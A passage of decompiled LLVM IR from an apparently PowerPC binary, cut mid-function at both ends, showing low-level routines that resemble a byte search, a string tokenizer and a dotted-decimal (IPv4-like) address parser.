  %v1_1000a584 = add i32 %v0_1000a584, -1
  store i32 %v1_1000a584, i32* %ctr.global-to-local, align 4
  %v2_1000a584 = icmp eq i32 %v1_1000a584, 0
  br i1 %v2_1000a584, label %dec_label_pc_1000a588, label %dec_label_pc_1000a574.dec_label_pc_1000a574_crit_edge

dec_label_pc_1000a574.dec_label_pc_1000a574_crit_edge: ; preds = %dec_label_pc_1000a574
  %v1_1000a578.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a574

dec_label_pc_1000a588:                            ; preds = %dec_label_pc_1000a574, %dec_label_pc_1000a568
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000a584, { 1, 0 }
  uselistorder i32 %v1_1000a580, { 1, 0 }
  uselistorder i32 %v0_1000a568, { 1, 2, 0 }
  uselistorder i32 %v1_1000a564, { 2, 1, 0 }
  uselistorder i32 %v1_1000a4e8, { 0, 2, 1 }
  uselistorder i32 %v1_1000a4e4, { 0, 2, 1 }
  uselistorder i32 %v0_1000a520, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000a4c0, { 1, 0 }
  uselistorder i32 %v1_1000a4bc, { 1, 0 }
  uselistorder i32 %v0_1000a4e016, { 1, 0 }
  uselistorder i32 %v0_1000a4b8, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000a4bc, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000a4b0, { 1, 0 }
  uselistorder i32 %v1_1000a4a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a4ac7, { 2, 0, 1 }
  uselistorder i32 %v1_1000a48c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a574, { 1, 0 }
  uselistorder label %dec_label_pc_1000a564.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4b4, { 1, 0 }
}

define i32 @function_1000a590(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000a590:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268477868, i32* @lr, align 4
  %v0_1000a5a8 = call i32 @function_10006d8c()
  %v0_1000a5b0 = load i32, i32* @r28, align 4
  %v1_1000a5b0 = load i32, i32* @r29, align 4
  %v2_1000a5b0 = add i32 %v1_1000a5b0, %v0_1000a5b0
  ret i32 %v2_1000a5b0
}

define i32 @function_1000a5c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a5c4:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000a5c8 = urem i32 %arg2, 256
  store i32 %v1_1000a5c8, i32* %r4.global-to-local, align 4
  %v2_1000a5d0 = add i32 %arg3, %arg1
  store i32 %v2_1000a5d0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000a5ec13 = icmp eq i32 %arg3, 0
  br i1 %v2_1000a5ec13, label %dec_label_pc_1000a5f4, label %dec_label_pc_1000a5f0

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5f0
  %v1_1000a5d8 = add i32 %v0_1000a5d8, -1
  %v2_1000a5d8 = inttoptr i32 %v1_1000a5d8 to i8*
  %v3_1000a5d8 = load i8, i8* %v2_1000a5d8, align 1
  %v4_1000a5d8 = zext i8 %v3_1000a5d8 to i32
  store i32 %v1_1000a5d8, i32* %r3.global-to-local, align 4
  %v0_1000a5dc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a5dc = add i32 %v0_1000a5dc, -1
  store i32 %v1_1000a5dc, i32* %r5.global-to-local, align 4
  %v1_1000a5e0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a5e0 = icmp eq i32 %v4_1000a5d8, %v1_1000a5e0
  %v0_1000a5e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a5e0, i32 %v0_1000a5e4)
  %v0_1000a5e8 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000a5ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5ec = add i32 %v0_1000a5ec, -1
  store i32 %v1_1000a5ec, i32* %ctr.global-to-local, align 4
  %v2_1000a5ec = icmp eq i32 %v1_1000a5ec, 0
  br i1 %v2_1000a5ec, label %dec_label_pc_1000a5f4.loopexit, label %dec_label_pc_1000a5f0

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a5c4, %dec_label_pc_1000a5d8
  %v0_1000a5d8 = phi i32 [ %v0_1000a5e8, %dec_label_pc_1000a5d8 ], [ %v2_1000a5d0, %dec_label_pc_1000a5c4 ]
  %v0_1000a5f0.in.in = phi i32 [ %v0_1000a5e8, %dec_label_pc_1000a5d8 ], [ %v2_1000a5d0, %dec_label_pc_1000a5c4 ]
  %v0_1000a5f0.in = urem i32 %v0_1000a5f0.in.in, 4
  %v0_1000a5f0 = icmp eq i32 %v0_1000a5f0.in, 0
  br i1 %v0_1000a5f0, label %dec_label_pc_1000a5f4.loopexit, label %dec_label_pc_1000a5d8

dec_label_pc_1000a5f4.loopexit:                   ; preds = %dec_label_pc_1000a5f0, %dec_label_pc_1000a5d8
  %v0_1000a61c16.ph = phi i32 [ %v0_1000a5e8, %dec_label_pc_1000a5d8 ], [ %v0_1000a5d8, %dec_label_pc_1000a5f0 ]
  %v0_1000a5f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000a5f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a5f4

dec_label_pc_1000a5f4:                            ; preds = %dec_label_pc_1000a5f4.loopexit, %dec_label_pc_1000a5c4
  %v0_1000a5f8 = phi i32 [ 0, %dec_label_pc_1000a5c4 ], [ %v0_1000a5f8.pre, %dec_label_pc_1000a5f4.loopexit ]
  %v0_1000a5f4 = phi i32 [ %v1_1000a5c8, %dec_label_pc_1000a5c4 ], [ %v0_1000a5f4.pre, %dec_label_pc_1000a5f4.loopexit ]
  %v0_1000a61c16 = phi i32 [ %v2_1000a5d0, %dec_label_pc_1000a5c4 ], [ %v0_1000a61c16.ph, %dec_label_pc_1000a5f4.loopexit ]
  %v1_1000a5f4 = mul i32 %v0_1000a5f4, 256
  %v1_1000a5f8 = udiv i32 %v0_1000a5f8, 4
  %v2_1000a5fc = or i32 %v1_1000a5f4, %v0_1000a5f4
  %v1_1000a604 = mul i32 %v2_1000a5fc, 65536
  %v2_1000a610 = or i32 %v1_1000a604, %v2_1000a5fc
  store i32 %v2_1000a610, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a5f8, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000a5f8, 4
  br i1 %tmp, label %dec_label_pc_1000a694, label %dec_label_pc_1000a61c

dec_label_pc_1000a61c:                            ; preds = %dec_label_pc_1000a5f4, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge
  %v0_1000a69021 = phi i32 [ %v1_1000a690, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge ], [ %v1_1000a5f8, %dec_label_pc_1000a5f4 ]
  %v0_1000a63c = phi i32 [ %v0_1000a63c.pre, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge ], [ -2130640640, %dec_label_pc_1000a5f4 ]
  %v0_1000a624 = phi i32 [ %v0_1000a624.pre, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge ], [ %v2_1000a610, %dec_label_pc_1000a5f4 ]
  %v0_1000a620 = phi i32 [ %v0_1000a620.pre, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge ], [ %v0_1000a5f8, %dec_label_pc_1000a5f4 ]
  %v0_1000a61c = phi i32 [ %v0_1000a61c.pre, %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge ], [ %v0_1000a61c16, %dec_label_pc_1000a5f4 ]
  %v1_1000a61c = add i32 %v0_1000a61c, -4
  %v2_1000a61c = inttoptr i32 %v1_1000a61c to i32*
  %v3_1000a61c = load i32, i32* %v2_1000a61c, align 4
  store i32 %v1_1000a61c, i32* %r3.global-to-local, align 4
  %v1_1000a620 = add i32 %v0_1000a620, -4
  store i32 %v1_1000a620, i32* %r5.global-to-local, align 4
  %v2_1000a624 = xor i32 %v3_1000a61c, %v0_1000a624
  %v1_1000a628 = add i32 %v0_1000a61c, -3
  %v1_1000a630 = add i32 %v2_1000a624, 2130640639
  %v1_1000a638 = add i32 %v0_1000a61c, -2
  %v2_1000a634 = sub i32 -1, %v2_1000a624
  %v2_1000a63c = xor i32 %v1_1000a630, %v2_1000a634
  %v3_1000a63c = and i32 %v2_1000a63c, %v0_1000a63c
  %v6_1000a63c = icmp eq i32 %v3_1000a63c, 0
  %v1_1000a640 = add i32 %v0_1000a61c, -1
  br i1 %v6_1000a63c, label %dec_label_pc_1000a690.backedge, label %dec_label_pc_1000a648

dec_label_pc_1000a648:                            ; preds = %dec_label_pc_1000a61c
  %v2_1000a648 = inttoptr i32 %v1_1000a640 to i8*
  %v3_1000a648 = load i8, i8* %v2_1000a648, align 1
  %v4_1000a648 = zext i8 %v3_1000a648 to i32
  %v1_1000a64c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a64c = icmp eq i32 %v4_1000a648, %v1_1000a64c
  br i1 %v4_1000a64c, label %dec_label_pc_1000a654, label %dec_label_pc_1000a65c

dec_label_pc_1000a654:                            ; preds = %dec_label_pc_1000a648
  store i32 %v1_1000a640, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a640

dec_label_pc_1000a65c:                            ; preds = %dec_label_pc_1000a648
  %v2_1000a65c = inttoptr i32 %v1_1000a638 to i8*
  %v3_1000a65c = load i8, i8* %v2_1000a65c, align 1
  %v4_1000a65c = zext i8 %v3_1000a65c to i32
  %v4_1000a660 = icmp eq i32 %v4_1000a65c, %v1_1000a64c
  br i1 %v4_1000a660, label %dec_label_pc_1000a668, label %dec_label_pc_1000a670

dec_label_pc_1000a668:                            ; preds = %dec_label_pc_1000a65c
  store i32 %v1_1000a638, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a638

dec_label_pc_1000a670:                            ; preds = %dec_label_pc_1000a65c
  %v2_1000a670 = inttoptr i32 %v1_1000a628 to i8*
  %v3_1000a670 = load i8, i8* %v2_1000a670, align 1
  %v4_1000a670 = zext i8 %v3_1000a670 to i32
  %v4_1000a674 = icmp eq i32 %v4_1000a670, %v1_1000a64c
  br i1 %v4_1000a674, label %dec_label_pc_1000a67c, label %dec_label_pc_1000a684

dec_label_pc_1000a67c:                            ; preds = %dec_label_pc_1000a670
  store i32 %v1_1000a628, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a628

dec_label_pc_1000a684:                            ; preds = %dec_label_pc_1000a670
  %v1_1000a684 = inttoptr i32 %v1_1000a61c to i8*
  %v2_1000a684 = load i8, i8* %v1_1000a684, align 1
  %v3_1000a684 = zext i8 %v2_1000a684 to i32
  %v4_1000a688 = icmp eq i32 %v3_1000a684, %v1_1000a64c
  %v0_1000a68c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a688, i32 %v0_1000a68c)
  %v0_1000a690.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a690.backedge

dec_label_pc_1000a690.backedge:                   ; preds = %dec_label_pc_1000a684, %dec_label_pc_1000a61c
  %v0_1000a690 = phi i32 [ %v0_1000a690.pre, %dec_label_pc_1000a684 ], [ %v0_1000a69021, %dec_label_pc_1000a61c ]
  %v1_1000a690 = add i32 %v0_1000a690, -1
  store i32 %v1_1000a690, i32* %ctr.global-to-local, align 4
  %v2_1000a690 = icmp eq i32 %v1_1000a690, 0
  br i1 %v2_1000a690, label %dec_label_pc_1000a690.dec_label_pc_1000a694_crit_edge, label %dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge

dec_label_pc_1000a690.backedge.dec_label_pc_1000a61c_crit_edge: ; preds = %dec_label_pc_1000a690.backedge
  %v0_1000a61c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000a620.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000a624.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000a63c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a61c

dec_label_pc_1000a690.dec_label_pc_1000a694_crit_edge: ; preds = %dec_label_pc_1000a690.backedge
  %v0_1000a694.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a694

dec_label_pc_1000a694:                            ; preds = %dec_label_pc_1000a690.dec_label_pc_1000a694_crit_edge, %dec_label_pc_1000a5f4
  %v0_1000a694 = phi i32 [ %v0_1000a694.pre, %dec_label_pc_1000a690.dec_label_pc_1000a694_crit_edge ], [ %v0_1000a5f8, %dec_label_pc_1000a5f4 ]
  %v1_1000a694 = add i32 %v0_1000a694, 1
  store i32 %v1_1000a694, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a694, i32* %ctr.global-to-local, align 4
  %v2_1000a6ac3 = icmp eq i32 %v0_1000a694, 0
  br i1 %v2_1000a6ac3, label %dec_label_pc_1000a6b0, label %dec_label_pc_1000a6a0

dec_label_pc_1000a6a0:                            ; preds = %dec_label_pc_1000a694, %dec_label_pc_1000a6a0
  %v0_1000a6a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a6a0 = add i32 %v0_1000a6a0, -1
  %v2_1000a6a0 = inttoptr i32 %v1_1000a6a0 to i8*
  %v3_1000a6a0 = load i8, i8* %v2_1000a6a0, align 1
  %v4_1000a6a0 = zext i8 %v3_1000a6a0 to i32
  store i32 %v1_1000a6a0, i32* %r3.global-to-local, align 4
  %v1_1000a6a4 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a6a4 = icmp eq i32 %v4_1000a6a0, %v1_1000a6a4
  %v0_1000a6a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a6a4, i32 %v0_1000a6a8)
  %v0_1000a6ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a6ac = add i32 %v0_1000a6ac, -1
  store i32 %v1_1000a6ac, i32* %ctr.global-to-local, align 4
  %v2_1000a6ac = icmp eq i32 %v1_1000a6ac, 0
  br i1 %v2_1000a6ac, label %dec_label_pc_1000a6b0, label %dec_label_pc_1000a6a0

dec_label_pc_1000a6b0:                            ; preds = %dec_label_pc_1000a6a0, %dec_label_pc_1000a694
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000a6ac, { 1, 0 }
  uselistorder i32 %v0_1000a694, { 1, 2, 0 }
  uselistorder i32 %v1_1000a690, { 2, 1, 0 }
  uselistorder i32 %v1_1000a640, { 1, 0, 2 }
  uselistorder i32 %v1_1000a638, { 1, 0, 2 }
  uselistorder i32 %v1_1000a628, { 1, 0, 2 }
  uselistorder i32 %v2_1000a5fc, { 1, 0 }
  uselistorder i32 %v1_1000a5f8, { 1, 0 }
  uselistorder i32 %v0_1000a5f4, { 1, 0 }
  uselistorder i32 %v0_1000a5f8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000a5ec, { 1, 0 }
  uselistorder i32 %v0_1000a5e8, { 1, 0, 2 }
  uselistorder i32 %v2_1000a5d0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000a5c8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000a6a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a61c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5f0, { 1, 0 }
}

define i32 @function_1000a6b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a6b8:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a6bc = load i32, i32* @lr, align 4
  store i32 %v0_1000a6bc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000a6c4 = icmp eq i32 %arg1, 0
  %v0_1000a6cc = load i32, i32* @r5, align 4
  store i32 %v0_1000a6cc, i32* %r30.global-to-local, align 4
  %v0_1000a6d0 = load i32, i32* @r4, align 4
  store i32 %v0_1000a6d0, i32* %r29.global-to-local, align 4
  br i1 %v3_1000a6c4, label %dec_label_pc_1000a6d8, label %dec_label_pc_1000a6dc

dec_label_pc_1000a6d8:                            ; preds = %dec_label_pc_1000a6b8
  %v1_1000a6d8 = inttoptr i32 %v0_1000a6cc to i32*
  %v2_1000a6d8 = load i32, i32* %v1_1000a6d8, align 4
  store i32 %v2_1000a6d8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a6dc

dec_label_pc_1000a6dc:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a6d8
  %v0_1000a6dc = phi i32 [ %arg1, %dec_label_pc_1000a6b8 ], [ %v2_1000a6d8, %dec_label_pc_1000a6d8 ]
  store i32 %v0_1000a6dc, i32* @r3, align 4
  %v1_1000a6e0 = inttoptr i32 %v0_1000a6dc to i8*
  %v2_1000a6e0 = call i32 @function_1000bb90(i8* %v1_1000a6e0)
  %v0_1000a6e4 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a6e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a6e8 = add i32 %v0_1000a6e8, %v2_1000a6e0
  %v3_1000a6e8 = inttoptr i32 %v2_1000a6e8 to i8*
  %v4_1000a6e8 = load i8, i8* %v3_1000a6e8, align 1
  store i32 %v2_1000a6e8, i32* @r31, align 4
  store i32 %v2_1000a6e8, i32* @r3, align 4
  %v3_1000a6f4 = icmp eq i8 %v4_1000a6e8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a6f4, label %dec_label_pc_1000a700, label %dec_label_pc_1000a708

dec_label_pc_1000a700:                            ; preds = %dec_label_pc_1000a6dc
  %v1_1000a700 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a700 = inttoptr i32 %v1_1000a700 to i32*
  store i32 %v2_1000a6e8, i32* %v2_1000a700, align 4
  br label %dec_label_pc_1000a740

dec_label_pc_1000a708:                            ; preds = %dec_label_pc_1000a6dc
  store i32 268478220, i32* @lr, align 4
  %v3_1000a708 = call i32 @function_1000a758(i8* %v3_1000a6e8, i32 %v0_1000a6e4)
  %v4_1000a710 = icmp eq i32 %v3_1000a708, 0
  %v0_1000a714 = load i32, i32* @r31, align 4
  store i32 %v0_1000a714, i32* @r3, align 4
  %v2_1000a718 = add i32 %v3_1000a708, 1
  store i32 %v2_1000a718, i32* %r11.global-to-local, align 4
  br i1 %v4_1000a710, label %dec_label_pc_1000a720, label %dec_label_pc_1000a730

dec_label_pc_1000a720:                            ; preds = %dec_label_pc_1000a708
  store i32 268478244, i32* @lr, align 4
  %v4_1000a720 = call i32 @function_1000b9d4(i32 %v0_1000a714, i32 0, i32 0)
  %v0_1000a724 = load i32, i32* @r31, align 4
  store i32 %v0_1000a724, i32* %r0.global-to-local, align 4
  %v1_1000a728 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a728 = inttoptr i32 %v1_1000a728 to i32*
  store i32 %v4_1000a720, i32* %v2_1000a728, align 4
  br label %dec_label_pc_1000a740

dec_label_pc_1000a730:                            ; preds = %dec_label_pc_1000a708
  %v1_1000a710 = inttoptr i32 %v3_1000a708 to i8*
  store i8 0, i8* %v1_1000a710, align 1
  %v0_1000a738 = load i32, i32* @r31, align 4
  store i32 %v0_1000a738, i32* %r0.global-to-local, align 4
  %v0_1000a73c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a73c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a73c = inttoptr i32 %v1_1000a73c to i32*
  store i32 %v0_1000a73c, i32* %v2_1000a73c, align 4
  br label %dec_label_pc_1000a740

dec_label_pc_1000a740:                            ; preds = %dec_label_pc_1000a720, %dec_label_pc_1000a700, %dec_label_pc_1000a730
  %v0_1000a740 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a6bc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a740

; uselistorder directives
  uselistorder i32 %v3_1000a708, { 2, 0, 1 }
  uselistorder i32 %v2_1000a6e8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000a6dc, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000a740, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a6dc, { 1, 0 }
}

define i32 @function_1000a758(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a758:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a7781 = load i32, i32* @r3, align 4
  %v1_1000a7782 = inttoptr i32 %v0_1000a7781 to i8*
  %v2_1000a7783 = load i8, i8* %v1_1000a7782, align 1
  %v3_1000a7784 = zext i8 %v2_1000a7783 to i32
  store i32 %v3_1000a7784, i32* %r11.global-to-local, align 4
  %v3_1000a77c6 = icmp eq i8 %v2_1000a7783, 0
  br i1 %v3_1000a77c6, label %dec_label_pc_1000a78c, label %dec_label_pc_1000a784

dec_label_pc_1000a75c:                            ; preds = %dec_label_pc_1000a760
  %v3_1000a760 = zext i8 %v2_1000a760 to i32
  %v4_1000a76c = icmp eq i32 %v3_1000a760, %v1_1000a76c
  %v0_1000a75c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a76c, i32 %v0_1000a75c)
  %v0_1000a760.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a76c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a760

dec_label_pc_1000a760:                            ; preds = %dec_label_pc_1000a784, %dec_label_pc_1000a75c
  %v1_1000a76c = phi i32 [ %v1_1000a76c9, %dec_label_pc_1000a784 ], [ %v1_1000a76c.pre, %dec_label_pc_1000a75c ]
  %v0_1000a760 = phi i32 [ %tmp, %dec_label_pc_1000a784 ], [ %v0_1000a760.pre, %dec_label_pc_1000a75c ]
  %v1_1000a760 = inttoptr i32 %v0_1000a760 to i8*
  %v2_1000a760 = load i8, i8* %v1_1000a760, align 1
  %v1_1000a764 = add i32 %v0_1000a760, 1
  store i32 %v1_1000a764, i32* %r9.global-to-local, align 4
  %v3_1000a768 = icmp eq i8 %v2_1000a760, 0
  br i1 %v3_1000a768, label %dec_label_pc_1000a774, label %dec_label_pc_1000a75c

dec_label_pc_1000a774:                            ; preds = %dec_label_pc_1000a760
  %v0_1000a774 = load i32, i32* @r3, align 4
  %v1_1000a774 = add i32 %v0_1000a774, 1
  store i32 %v1_1000a774, i32* @r3, align 4
  %v1_1000a778 = inttoptr i32 %v1_1000a774 to i8*
  %v2_1000a778 = load i8, i8* %v1_1000a778, align 1
  %v3_1000a778 = zext i8 %v2_1000a778 to i32
  store i32 %v3_1000a778, i32* %r11.global-to-local, align 4
  %v3_1000a77c = icmp eq i8 %v2_1000a778, 0
  br i1 %v3_1000a77c, label %dec_label_pc_1000a78c, label %dec_label_pc_1000a784

dec_label_pc_1000a784:                            ; preds = %dec_label_pc_1000a758, %dec_label_pc_1000a774
  %v1_1000a76c9 = phi i32 [ %v3_1000a778, %dec_label_pc_1000a774 ], [ %v3_1000a7784, %dec_label_pc_1000a758 ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a760

dec_label_pc_1000a78c:                            ; preds = %dec_label_pc_1000a774, %dec_label_pc_1000a758
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000a760, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a784, { 1, 0 }
}

define i32 @function_1000a794(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000a794:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000a794 = icmp eq i8* %arg1, null
  br i1 %v3_1000a794, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a79c

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000a794
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000a7b0.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000a7ac

dec_label_pc_1000a7ac:                            ; preds = %dec_label_pc_1000a79c, %dec_label_pc_1000a824
  %v0_1000a824 = phi i32 [ 0, %dec_label_pc_1000a79c ], [ %v2_1000a82c, %dec_label_pc_1000a824 ]
  %v0_1000a828 = phi i32 [ 1, %dec_label_pc_1000a79c ], [ %v1_1000a828, %dec_label_pc_1000a824 ]
  %v0_1000a7ac = phi i32 [ %tmp, %dec_label_pc_1000a79c ], [ %v0_1000a7ac3, %dec_label_pc_1000a824 ]
  %v1_1000a7ac = inttoptr i32 %v0_1000a7ac to i8*
  %v2_1000a7ac = load i8, i8* %v1_1000a7ac, align 1
  %v3_1000a7ac = zext i8 %v2_1000a7ac to i32
  %v1_1000a7b4 = mul nuw nsw i32 %v3_1000a7ac, 2
  %v2_1000a7b8 = add i32 %v1_1000a7b4, %v3_1000a7b0.pre
  %v3_1000a7b8 = inttoptr i32 %v2_1000a7b8 to i16*
  %v4_1000a7b8 = load i16, i16* %v3_1000a7b8, align 2
  %v1_1000a7bc = and i16 %v4_1000a7b8, 8
  %v3_1000a7bc = icmp eq i16 %v1_1000a7bc, 0
  br i1 %v3_1000a7bc, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a7c4

dec_label_pc_1000a7c4:                            ; preds = %dec_label_pc_1000a7ac
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7cc:                            ; preds = %dec_label_pc_1000a7dc
  %v1_1000a7e0 = mul i32 %v1_1000a82c, 10
  %v2_1000a7e8 = add i32 %v3_1000a7dc, %v1_1000a7e0
  %v1_1000a7cc = add i32 %v2_1000a7e8, -48
  %v1_1000a7d0 = add i32 %v0_1000a814, 1
  %v2_1000a7d4 = icmp sgt i32 %v1_1000a7cc, 255
  br i1 %v2_1000a7d4, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a7cc, %dec_label_pc_1000a7c4
  %v1_1000a82c = phi i32 [ %v1_1000a7cc, %dec_label_pc_1000a7cc ], [ 0, %dec_label_pc_1000a7c4 ]
  %v0_1000a814 = phi i32 [ %v1_1000a7d0, %dec_label_pc_1000a7cc ], [ %v0_1000a7ac, %dec_label_pc_1000a7c4 ]
  %v1_1000a7dc = inttoptr i32 %v0_1000a814 to i8*
  %v2_1000a7dc = load i8, i8* %v1_1000a7dc, align 1
  %v3_1000a7dc = zext i8 %v2_1000a7dc to i32
  %v1_1000a7e4 = mul nuw nsw i32 %v3_1000a7dc, 2
  %v2_1000a7ec = add i32 %v1_1000a7e4, %v3_1000a7b0.pre
  %v3_1000a7ec = inttoptr i32 %v2_1000a7ec to i16*
  %v4_1000a7ec = load i16, i16* %v3_1000a7ec, align 2
  %v5_1000a7ec = zext i16 %v4_1000a7ec to i32
  %v1_1000a7f0 = and i32 %v5_1000a7ec, 8
  %v3_1000a7f0 = icmp eq i32 %v1_1000a7f0, 0
  br i1 %v3_1000a7f0, label %dec_label_pc_1000a7f8, label %dec_label_pc_1000a7cc

dec_label_pc_1000a7f8:                            ; preds = %dec_label_pc_1000a7dc
  %v2_1000a7f8 = icmp sgt i32 %v0_1000a828, 3
  br i1 %v2_1000a7f8, label %dec_label_pc_1000a810, label %dec_label_pc_1000a800

dec_label_pc_1000a800:                            ; preds = %dec_label_pc_1000a7f8
  %v3_1000a800 = icmp eq i8 %v2_1000a7dc, 46
  br i1 %v3_1000a800, label %dec_label_pc_1000a808, label %dec_label_pc_1000a84c

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a800
  %v1_1000a808 = add i32 %v0_1000a814, 1
  br label %dec_label_pc_1000a824

dec_label_pc_1000a810:                            ; preds = %dec_label_pc_1000a7f8
  %v3_1000a810 = icmp eq i8 %v2_1000a7dc, 0
  %v1_1000a814 = add i32 %v0_1000a814, 1
  br i1 %v3_1000a810, label %dec_label_pc_1000a824, label %dec_label_pc_1000a81c

dec_label_pc_1000a81c:                            ; preds = %dec_label_pc_1000a810
